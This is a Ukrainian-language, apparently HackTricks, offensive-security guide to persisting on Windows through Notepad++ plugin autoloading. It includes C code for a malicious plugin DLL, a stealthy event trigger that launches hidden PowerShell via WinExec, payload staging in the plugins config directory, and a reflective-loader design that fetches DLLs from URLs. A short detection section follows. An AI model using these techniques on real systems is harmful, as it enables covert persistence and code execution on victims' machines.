# Persistence через автозавантаження плагінів Notepad++ і виконання коду

{{#include ../../banners/hacktricks-training.md}}

Notepad++ **автоматично завантажує кожну DLL плагіна, знайдену в підпапках `plugins`**, під час запуску. Розміщення шкідливого плагіна в будь-якій **доступній для запису інсталяції Notepad++** забезпечує виконання коду в `notepad++.exe` щоразу, коли запускається редактор. Це можна використати для **закріплення**, прихованого **первинного виконання** або як **завантажувач у процесі**, якщо редактор запущено з підвищеними правами.<sup>[[1]](#references)</sup>

Починаючи з **Notepad++ 7.6+**, очікувана структура для ручного встановлення — **окрема підпапка для кожного плагіна** (`plugins\<PluginName>\<PluginName>.dll`). У **portable mode** (наявність `doLocalConf.xml` поруч із `notepad++.exe`) все дерево програми залишається в цій директорії, що часто перетворює скопійовані набори інструментів адміністратора на просту поверхню для виконання коду, доступну для запису користувачеві.<sup>[[2]](#references)</sup>

## Доступні для запису розташування плагінів

- Стандартна інсталяція: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (зазвичай для запису потрібні права адміністратора).<sup>[[1]](#references)</sup>
- Доступні для запису варіанти для операторів із низькими привілеями:<sup>[[1]](#references)</sup>
  - Використати **portable-збірку Notepad++** у папці, доступній для запису користувачеві.
  - Скопіювати `C:\Program Files\Notepad++` у шлях, контрольований користувачем (наприклад, `%LOCALAPPDATA%\npp\`), і запустити звідти `notepad++.exe`.
  - Пошукати **набори інструментів адміністратора**, розпаковані копії zip-архівів або набори інструментів служби підтримки, які вже містять `doLocalConf.xml` і розташовані поза `Program Files`.
- Кожен плагін має власну підпапку в `plugins` і автоматично завантажується під час запуску; пункти меню з’являються в розділі **Plugins**.<sup>[[2]](#references)</sup>

Швидка перевірка:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Точки завантаження плагіна (примітиви виконання)
Notepad++ очікує наявності певних **експортованих функцій**. Усі вони викликаються під час ініціалізації, створюючи кілька можливостей для виконання коду:<sup>[[1]](#references)</sup>
- **`DllMain`** — виконується відразу після завантаження DLL (перша точка виконання).
- **`setInfo(NppData)`** — викликається один раз під час завантаження для передавання дескрипторів Notepad++; зазвичай тут реєструють пункти меню.
- **`getName()`** — повертає назву плагіна, яка відображається в меню.
- **`getFuncsArray(int *nbF)`** — повертає команди меню; ця функція викликається під час запуску, навіть якщо масив порожній.
- **`beNotified(SCNotification*)`** — отримує події Notepad++ / Scintilla (корисно, щоб відкласти запуск payload до дії користувача або події редактора).
- **`messageProc(UINT, WPARAM, LPARAM)`** — обробник повідомлень, корисний для обміну більшими обсягами даних.
- **`isUnicode()`** — прапорець сумісності, який перевіряється під час завантаження.

Більшість експортованих функцій можна реалізувати як **заглушки**; виконання може відбуватися в `DllMain` або в будь-якому з наведених вище callback під час автоматичного завантаження.

## Мінімальний каркас шкідливого плагіна
Скомпілюйте DLL з очікуваними експортами та розмістіть її в `plugins\\MyNewPlugin\\MyNewPlugin.dll` у доступній для запису папці Notepad++:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Зберіть DLL (Visual Studio/MinGW).
2. Створіть підпапку плагіна в `plugins` і помістіть туди DLL.
3. Перезапустіть Notepad++; DLL завантажиться автоматично, виконавши `DllMain` і подальші callback-функції.

## Тригерний шаблон із низьким рівнем шуму через `beNotified`
Для OPSEC багато payloads **не повинні** запускатися з `DllMain`. Тихіший підхід — дозволити плагіну завантажитися без проблем, а потім виконати код лише після реалістичної події в редакторі, наприклад **завершення запуску**, **активації буфера** або **введення першого символу**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

Це краще відповідає відкритим дослідженням наступальних технік, ніж помітний beacon у `DllMain`: DLL усе ще автоматично завантажується під час запуску, але шкідлива дія відкладається, доки Notepad++ справді не почне використовуватися.

## Використання каталогу конфігурації плагінів як додаткового сховища
Notepad++ надає `NPPM_GETPLUGINSCONFIGDIR`, який повертає **каталог конфігурації плагінів поточного користувача**.<sup>[[3]](#references)</sup> Шкідливий плагін може скористатися цим, щоб залишити DLL на диску мінімальною, а зашифровану конфігурацію, підготовлені payload-файли або файли із завданнями зберігати за шляхом, який не вирізняється на тлі звичайного стану плагінів.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Операційно це корисно, коли потрібно:
- невелика autoloaded bootstrap DLL;
- tasking для окремого користувача без повторної зміни основного plugin binary;
- відокремити **autoload trigger** від важчого second stage.

## Reflective loader plugin pattern
Weaponized plugin може перетворити Notepad++ на **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Додати мінімальний елемент інтерфейсу/меню (наприклад, "LoadDLL").
- Приймати **file path** або **URL** для отримання payload DLL.
- Reflectively відобразити DLL у поточний процес і викликати експортовану точку входу (наприклад, loader function усередині отриманої DLL).
- Перевага: повторно використати GUI-процес, що має нешкідливий вигляд, замість запуску нового loader; payload успадковує рівень цілісності `notepad++.exe` (зокрема й підвищений).
- Компроміси: запис **unsigned plugin DLL** на диск помітний; практичний варіант — використовувати autoloaded plugin лише як stub, а справжній implant зберігати зашифрованим/підготовленим в іншому місці.

## Примітки щодо виявлення та посилення захисту
- Блокувати або відстежувати **запис у каталоги плагінів Notepad++** (зокрема portable-копії у профілях користувачів); увімкнути контрольований доступ до папок або allowlisting програм.
- Створювати сповіщення про **нові unsigned DLL** у `plugins`, зміни в portable-деревах Notepad++ та незвичні **дочірні процеси/мережеву активність** від `notepad++.exe`.
- Створити базовий перелік легітимних плагінів і перевіряти будь-яку нову DLL, яка експортує стандартний інтерфейс плагіна Notepad++, але також запускає shell, PowerShell або мережеві beacon-и.
- Дозволяти встановлення плагінів лише через **Plugins Admin** і обмежити запуск portable-копій із ненадійних шляхів.

## References

- [1] [TrustedSec - Плагіни Notepad++: підключення та payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Посібник користувача Notepad++ - Плагіни](https://npp-user-manual.org/docs/plugins/)
- [3] [Посібник користувача Notepad++ - Взаємодія плагінів](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
